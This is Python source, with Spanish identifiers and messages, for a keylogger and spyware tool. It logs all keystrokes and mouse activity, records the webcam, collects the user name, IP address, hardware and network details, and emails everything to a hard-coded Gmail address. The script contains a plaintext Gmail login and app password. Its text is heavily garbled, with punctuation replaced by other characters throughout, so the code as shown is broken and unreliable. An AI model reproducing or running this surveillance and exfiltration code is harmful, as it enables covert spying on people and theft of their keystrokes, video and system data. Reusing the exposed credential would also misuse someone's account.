
from pynput import mouse, keyboard
from pynput.mouse import Button
import time, os, pickle, socket, psutil, getpass, platform, pyttsx3, cv2, threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

tabla?datos ¿ ´+
last?click ¿ 0

def habla)texto=Ñ
    engine ¿ pyttsx3.init)=
    engine.setProperty){rate{, 190=
    engine.setProperty){volume{, 1=
    voices ¿ engine.getProperty){voices{=
    engine.setProperty){voice{, voices´0+.id=
    engine.say)texto=
    engine.runAndWait)=

class VideoRecorderÑ
    def ??init??)self=Ñ
        tiempo?actual ¿ time.time)=
        fecha?hora?actual ¿ time.localtime)tiempo?actual=
        fecha?hora?actual?str ¿ time.strftime)[%d'%m'%Y?%H'%M[, fecha?hora?actual=
        obtener?datos ¿ obtencion?datos)=
        dato?usuario ¿ obtener?datos.datos?usuario)=
        dato?nom ¿ dato?usuario´0+.replace){ {, {?{=
        num?usuario ¿ f[¨dato?nom*?¨fecha?hora?actual?str*.mp4[
        self.filename ¿ num?usuario
        self.recording ¿ False        
        self.ruta?video ¿ None

    def record)self, duration=Ñ        
        cap ¿ cv2.VideoCapture)0=
        if not cap.isOpened)=Ñ
            print)[}nNo se pudo abrir la camara.[=
            habla)[No se pudo abrir la camara.[=
            cap.release)=
            return
        ruta?carpeta?video ¿ os.path.join)os.getcwd)=, {Data?Video{=
        if not os.path.exists)ruta?carpeta?video=Ñ
            os.makedirs)ruta?carpeta?video=            
        self.ruta?video ¿ os.path.join)ruta?carpeta?video,self.filename=
        fourcc ¿ cv2.VideoWriter?fourcc)({mp4v{=
        max?res ¿ )int)cap.get)cv2.CAP?PROP?FRAME?WIDTH==, int)cap.get)cv2.CAP?PROP?FRAME?HEIGHT===
        out ¿ cv2.VideoWriter)self.ruta?video, fourcc, 35.0, max?res= #)640, 480=        
        start?time ¿ time.time)=
        while cap.isOpened)= and self.recordingÑ
            ret, frame ¿ cap.read)=
            if retÑ                
                out.write)frame=              
                if time.time)= ' start?time : durationÑ 
                    break
            elseÑ
                break
        cap.release)=
        out.release)=
        cv2.destroyAllWindows)=

    def start?recording)self, duration=Ñ
        self.recording ¿ True
        self.thread ¿ threading.Thread)target¿self.record, args¿)duration,==
        self.thread.start)=
    def stop?recording)self=Ñ
        if hasattr)self, {thread{= and self.thread.is?alive)=Ñ
            self.recording ¿ False
            self.thread.join)=
        return self.ruta?video

def on?press)key=Ñ  
    tryÑ
        if key ¿¿ keyboard.Key.escÑ
            tryÑ         
                recorder.stop?recording)=                
                listener.stop)=
                listener?k.stop)=
            except NameErrorÑ
                print)[}n}t' No se inicio el hilo {listener?k{ que corresponde la escucha del teclado}n[=
            return False
        elseÑ  
            if key ¿¿ keyboard.Key.enterÑ       key ¿ {enter{
            elif key ¿¿ keyboard.Key.spaceÑ     key ¿ {space{ 
            elif key ¿¿ keyboard.Key.backspaceÑ key ¿ {backspace{            
            elif key ¿¿ keyboard.Key.caps?lockÑ key ¿ {capslock{
            elif key ¿¿ keyboard.Key.tabÑ       key ¿ {tab{
            elif key ¿¿ keyboard.Key.shiftÑ     key ¿ {shift{
            elif key ¿¿ keyboard.Key.ctrl?lÑ    key ¿ {ctrlleft{
            elif key ¿¿ keyboard.Key.alt?lÑ     key ¿ {altleft{
            elif key ¿¿ keyboard.Key.cmdÑ       key ¿ {win{
            elif key ¿¿ keyboard.Key.alt?grÑ    key ¿ {altright{
            elif key ¿¿ keyboard.Key.ctrl?rÑ    key ¿ {ctrlright{
            elif key ¿¿ keyboard.Key.shift?rÑ   key ¿ {shiftright{
            elif key ¿¿ keyboard.Key.deleteÑ    key ¿ {delete{
            elif key ¿¿ keyboard.Key.upÑ        key ¿ {up{
            elif key ¿¿ keyboard.Key.leftÑ      key ¿ {left{
            elif key ¿¿ keyboard.Key.downÑ      key ¿ {down{
            elif key ¿¿ keyboard.Key.rightÑ     key ¿ {right{
            key ¿ str)key=.replace)[{[, [[=            
            tecla ¿ ¨{key{Ñkey, {Boton{Ñ {teclado{*
            tabla?datos.append)tecla=
    except AttributeErrorÑ
        print)f{}t' Tecla especialÑ ¨key* presionada{=
    
def on?move)x, y=Ñ
    move ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ {movimiento{*
    tabla?datos.append)move=
def on?click)x, y, button, pressed=Ñ
    global last?click
    if pressedÑ
        current?time ¿ time.time)=
        if current?time ' last?click ; 0.3 and button ¿¿ Button.leftÑ
            clic ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ {Doble clic left{, {Estado{Ñ pressed*
            tabla?datos.append)clic=
        elif current?time ' last?click ; 0.3 and button ¿¿ Button.rightÑ
            clic ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ {Doble clic right{, {Estado{Ñ pressed*
            tabla?datos.append)clic=            
        elseÑ
            clic ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ button, {Estado{Ñ pressed*
            tabla?datos.append)clic=
        last?click ¿ current?time 
    elif not pressedÑ      
        clic ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ button, {Estado{Ñ pressed*
        tabla?datos.append)clic=
def on?scroll)x, y, dx, dy=Ñ
    scroll ¿ ¨{x{Ñ x, {y{Ñ y, {Boton{Ñ{scroll abajo{ if dy ; 0 else {scroll arriba{*
    tabla?datos.append)scroll=

class obtencion?datos)=Ñ
    def ??init??)self=Ñ
        self.nombre?usuario ¿{{
        self.carpeta?inicio?usuario ¿{{
        self.nombre?equipo ¿{{
        self.nombre?OS ¿{{
        self.nombre?OSV ¿{{
        self.cpu?count  ¿{{
        self.cpu?percent  ¿{{
        self.mem?total  ¿{{
        self.mem?available ¿{{
        self.disk?total  ¿{{
        self.disk?used  ¿{{
        self.disk?free  ¿{{
        self.ip ¿{{
        self.interfaces?red ¿ [[    
    def datos?equipo)self=Ñ
        self.nombre?equipo ¿ socket.gethostname)=
        self.nombre?OS ¿ platform.system)=
        self.nombre?OSV ¿platform.release)=
        self.cpu?count  ¿ psutil.cpu?count)=
        self.cpu?percent  ¿ psutil.cpu?percent)=
        virtual?mem ¿ psutil.virtual?memory)=
        self.mem?total  ¿ virtual?mem.total
        self.mem?available ¿ virtual?mem.available
        disk?usage ¿ psutil.disk?usage)os.path.expanduser)[°[==
        self.disk?total  ¿ disk?usage.total
        self.disk?used  ¿ disk?usage.used
        self.disk?free  ¿ disk?usage.free
        return self.nombre?equipo, self.nombre?OS, self.nombre?OSV, self.cpu?count, self.cpu?percent, self.mem?total, self.mem?available, self.disk?total, self.disk?used, self.disk?free
    def datos?usuario)self=Ñ
        self.nombre?usuario ¿ getpass.getuser)=
        self.carpeta?inicio?usuario ¿ os.path.expanduser)[°[=
        return self.nombre?usuario,self.carpeta?inicio?usuario
    def datos?red)self=Ñ
        self.ip ¿ socket.gethostbyname)socket.gethostname)==
        interfaces ¿ psutil.net?if?addrs)=   
        for interface?name, interface?addresses in interfaces.items)=Ñ
            self.interfaces?red ¡¿ f[}nInterfazÑ ïnterface?name*}n[
            for address in interface?addressesÑ
                self.interfaces?red ¡¿ f[' Tipo de direccionÑ äddress.family.name*}n[
                self.interfaces?red ¡¿ f[  Direccion MACÑ äddress.address*}n[
                self.interfaces?red ¡¿ f[  Mascara de redÑ äddress.netmask*}n[
                self.interfaces?red ¡¿ f[  BroadcastÑ äddress.broadcast*}n[        
        return self.ip, self.interfaces?red

def correo?send)ruta?archivo?txt, nombre?archivo?txt,ruta?video=Ñ
    obtener?datos ¿ obtencion?datos)=
    dato?equipo ¿ obtener?datos.datos?equipo)=
    dato?usuario ¿ obtener?datos.datos?usuario)=
    dato?red ¿ obtener?datos.datos?red)=
    remite ¿ {python"gmail.com{  
    destinatario ¿ {jcbotonero97"gmail.com{ 
    asunto ¿ {Correo informativo{ 
    texto?general ¿ f[[[Datos obtenidos satisfactoriamente y archivo guardado y adjuntadoÑ
    FechaÑ ¨nombre?archivo?txt*
    Nombre de la maquinaÑ ¨dato?equipo´0+*
    IpÑ ¨dato?red´0+*
    OS de la maquinaÑ ¨dato?equipo´1+*
    Version del OS de la maquinaÑ ¨dato?equipo´2+*
    Nombre de usuarioÑ ¨dato?usuario´0+*
    La carpeta de inicio esÑ ¨dato?usuario´1+*
    [[[
    texto?hardware ¿ f[[[Informacion del hardwareÑ
    Numero de nucleos de CPUÑ ¨dato?equipo´3+*
    Porcentaje de uso de CPUÑ ¨dato?equipo´4+*%
    Memoria totalÑ ¨dato?equipo´5+*B ¿ ¨format)dato?equipo´5+-)1024(1024(1024=,{.2f{=*GB
    Memoria disponibleÑ ¨dato?equipo´6+*B ¿ ¨format)dato?equipo´6+-)1024(1024(1024=,{.2f{=*GB
    Espacio en disco totalÑ ¨dato?equipo´7+*B ¿ ¨format)dato?equipo´7+-)1024(1024(1024=,{.2f{=*GB
    Espacio en disco utilizadoÑ ¨dato?equipo´8+*B ¿ ¨format)dato?equipo´8+-)1024(1024(1024=,{.2f{=*GB
    Espacio en disco libreÑ ¨dato?equipo´9+*B ¿ ¨format)dato?equipo´9+-)1024(1024(1024=,{.2f{=*GB

    [[[
    texto?interfaces?red ¿ f[[[Informacion de las interfaces de redÑ
        ¨dato?red´1+*

Entrada de teclado y mausÑ
    [[[  
    with open)ruta?archivo?txt, [rb[= as fileÑ
        datos?desencriptados ¿ pickle.load)file=
    with open)ruta?archivo?txt, [w[= as fÑ
        f.write)f[¨texto?general*}n[=
        f.write)f[¨texto?hardware*}n[=
        f.write)f[¨texto?interfaces?red*}n[=
        for item in datos?desencriptadosÑ
            f.write)str)item= ¡ [}n[=
    f.close)=

    mensaje ¿ MIMEMultipart)=
    mensaje´{From{+ ¿ remite
    mensaje´{To{+ ¿ destinatario
    mensaje´{Subject{+ ¿ asunto
    mensaje.attach)MIMEText)texto?general==
    with open)ruta?archivo?txt, {rb{= as fÑ
        adjunto ¿ MIMEBase){application{, {octet'stream{=
        adjunto.set?payload)f.read)==
        encoders.encode?base64)adjunto=
        adjunto.add?header){Content'Disposition{, {attachment{, filename¿f[¨dato?usuario´0+.replace){ {, {?{=*?¨nombre?archivo?txt*.txt[=
        mensaje.attach)adjunto=
    f.close)=
    if ruta?video !¿ NoneÑ
        with open)ruta?video, {rb{= as fÑ
            video?adjunto ¿ MIMEBase){application{, {octet'stream{=
            video?adjunto.set?payload)f.read)==
            encoders.encode?base64)video?adjunto=
            video?adjunto.add?header){Content'Disposition{, {attachment{, filename¿f[¨dato?usuario´0+.replace){ {, {?{=*?¨nombre?archivo?txt*.mp4[=
            mensaje.attach)video?adjunto=
        f.close)=
    print)f[}nDatos de la maquina ¨dato?equipo´0+* con ¨dato?equipo´1+* ¨dato?equipo´2+* de ¨dato?usuario´0+* registrados y archivos cargados, preparando el envio de la informacion[=
    habla)f[Datos de la maquina ¨dato?equipo´0+* con ¨dato?equipo´1+* ¨dato?equipo´2+* de ¨dato?usuario´0+* registrados y archivos cargados, preparando el envio de la informacion[=    
    tryÑ
        servidor?smtp ¿ smtplib.SMTP){smtp.gmail.com{, 587=  
        servidor?smtp.starttls)=
        servidor?smtp.login){bryanfely1"gmail.com{, {qyho vpyh kydn jgbg{=  
        servidor?smtp.sendmail)remite, destinatario, mensaje.as?string)==
        enviado?exitosamente ¿ True
    except socket.gaierror as eÑ
        print)f{Error al conectar con el servidor SMTPÑ ¨str)e=*{=
        habla)[No se puede resolver el nombre del servidor SMTP[=
        enviado?exitosamente ¿ False
    except ConnectionRefusedError as eÑ
        print)f{Error al conectar con el servidor SMTPÑ ¨str)e=*{=
        habla)[Servidor SMTP rechazo la conexion[=
        enviado?exitosamente ¿ False
    except TimeoutError as eÑ
        print)f{Error al conectar con el servidor SMTPÑ ¨str)e=*{=
        habla)[No hay respuesta del servidor SMTP[=
        enviado?exitosamente ¿ False        
    except )smtplib.SMTPConnectError, smtplib.SMTPAuthenticationError= as eÑ
        print)f{Error al conectar con el servidor SMTPÑ ¨str)e=*{=
        habla)[Hay un error en la conexion o autenticacion con el servidor SMTP[=
        enviado?exitosamente ¿ False     
    except Exception as eÑ
        print)f{Error al enviar el correoÑ ¨str)e=*{=
        habla)[Hay un error no conocido[=
        enviado?exitosamente ¿ False
    finallyÑ
        servidor?smtp.quit)=
    if enviado?exitosamenteÑ
        print){}nDatos enviadosÑ satisfactorio.{=
        habla)[Datos enviadosÑ satisfactorio.[=
    elseÑ
        print){}nLos datos no se han podido enviar.{=
        habla)[Los datos no se han podido enviar por el error anterior[=
        
def auto?run)ruta?video=Ñ

    ruta?archivo ¿ os.getcwd)=
    tiempo?actual ¿ time.time)=
    fecha?hora?actual ¿ time.localtime)tiempo?actual=
    fecha?hora?actual?str ¿ time.strftime)[%d'%m'%Y?%H'%M[, fecha?hora?actual=
    nombre?carpeta?nueva ¿ [Data?Archivo?txt[
    ruta?carpeta?nueva ¿ os.path.join)ruta?archivo, nombre?carpeta?nueva=
    print)[}nGuardando informacion en la base de datos[=
    habla)[Guardando informacion en la base de datos[=
    if not os.path.exists)ruta?carpeta?nueva=Ñ
        os.makedirs)ruta?carpeta?nueva=
    obtener?datos ¿ obtencion?datos)=
    dato?usuario ¿ obtener?datos.datos?usuario)=
    ruta?archivo?completa ¿ os.path.join)ruta?carpeta?nueva, f[¨dato?usuario´0+.replace){ {, {?{=*?¨fecha?hora?actual?str*.txt[=
    with open)ruta?archivo?completa, [wb[= as fÑ
        pickle.dump)tabla?datos, f=
    f.close)=
    print)[}nBase de datos guardada[=
    habla)[Base de datos guardada[=
    print)[}nObteniendo Datos del sistema, red y usuario[=
    habla)[Obteniendo Datos del sistema, de la red y el usuario[=
    correo?send)ruta?archivo?completa, fecha?hora?actual?str,ruta?video=

if ??name?? ¿¿ [??main??[Ñ
    print)[}nIniciando protocolos...[=
    habla)[Iniciando protocolos[=    
    tabla?datos.clear)=
    listener ¿ mouse.Listener)on?click¿on?click, on?move¿on?move, on?scroll¿on?scroll=
    listener?k ¿ keyboard.Listener)on?press¿on?press=
    listener.start)=    
    listener?k.start)=
    print)[Protocolo key preparado[=
    habla)[Protocolo key preparado[=
    recorder ¿ VideoRecorder)=
    recorder.start?recording)45=
    print)[Protocolo recoder preparado[=
    habla)[Protocolo recoder preparado[=
    listener?k.join)=
    ruta?video ¿ recorder.stop?recording)=
    print)ruta?video=
    auto?run)ruta?video=
